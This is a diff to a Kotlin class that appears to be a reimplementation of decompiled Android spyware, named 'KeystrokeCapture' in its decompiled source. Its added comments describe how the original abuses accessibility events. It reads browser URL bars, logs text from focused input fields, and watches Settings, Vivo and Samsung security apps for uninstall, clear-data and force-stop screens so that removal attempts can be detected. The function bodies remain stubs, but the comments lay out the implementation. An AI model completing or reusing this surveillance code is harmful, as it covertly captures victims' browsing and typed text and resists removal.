@@ -16,7 +16,7 @@ import java.util.concurrent.atomic.AtomicBoolean
  * JADX name: KeystrokeCapture
  */
 class PermissionAutoGrantDelegate(
-    // ADAPT: service reference replaced with interface
+    // vendor: constructor takes dqtvuisjd (service reference) — not held here for testability
 ) {
     companion object {
         private const val TAG = "KeystrokeCapture"
@@ -38,7 +38,8 @@ class PermissionAutoGrantDelegate(
         /** Settings packages that trigger monitoring */
         private val SETTINGS_PACKAGES = setOf(
             "com.android.settings",
-            // ADAPT: obfuscated package names decoded from StringUtil
+            // vendor: also includes StringUtil-decoded packages:
+            // "com.bbk.VivoSafe" and obfuscated Samsung/Huawei settings packages
             "com.bbk.VivoSafe",
             "com.samsung.android.sm"
         )
@@ -73,7 +74,9 @@ class PermissionAutoGrantDelegate(
     fun getAppName(packageName: String): String {
         val cached = appNameCache[packageName]
         if (cached != null) return cached
-        // ADAPT: stub — real impl loads from SharedPreferences + PackageManager
+        // vendor: loads SharedPreferences("app_name_cache") on first call via CAS guard (f53082a5),
+        // then queries PackageManager.getApplicationLabel for unknown packages.
+        // Without service context, falls back to last segment of package name.
         val shortName = packageName.substringAfterLast(".")
         return shortName
     }
@@ -93,13 +96,18 @@ class PermissionAutoGrantDelegate(
             val now = System.currentTimeMillis()
             if (now - lastSettingsCheckTime >= 10000) {
                 lastSettingsCheckTime = now
-                // ADAPT: stub — would check for uninstall/clear data buttons via rootInActiveWindow
+                // vendor: calls service.getRootInActiveWindow(), collectNodeTexts(3, root, list),
+                // then checks for keywords: 卸载/uninstall, 清除数据/clear data, 清除缓存/clear cache,
+                // 强行停止/force stop, 应用信息/app info — logs detection via ActivityMonitor.
+                // Requires service reference (dqtvuisjd) for getRootInActiveWindow().
             }
         }
 
         // Check browser URL bars
         if (ActivityMonitor.urlMonitorEnabled && BROWSER_URL_BAR_IDS.containsKey(packageName)) {
-            // ADAPT: stub — would read URL from accessibility node
+            // vendor: calls service.getRootInActiveWindow(), finds URL bar node by resource ID,
+            // reads text, reports URL via ActivityMonitor.m211547a9(appName, url) if starts with "http" or contains ".".
+            // Requires service reference (dqtvuisjd) for getRootInActiveWindow().
         }
     }
 
@@ -120,7 +128,8 @@ class PermissionAutoGrantDelegate(
                 onWindowChanged(pkg, appName)
             }
             if (eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED && ActivityMonitor.focusMonitorEnabled) {
-                // ADAPT: stub — focus event text capture
+                // vendor: on TYPE_VIEW_FOCUSED (64) with f53036b1 flag, reads event.text first/all,
+                // logs "[appName] firstText: allText" to ActivityMonitor FOCUS log type.
             }
         } catch (e: Exception) {
             Log.w(TAG, "处理事件失败: ${e.message}")
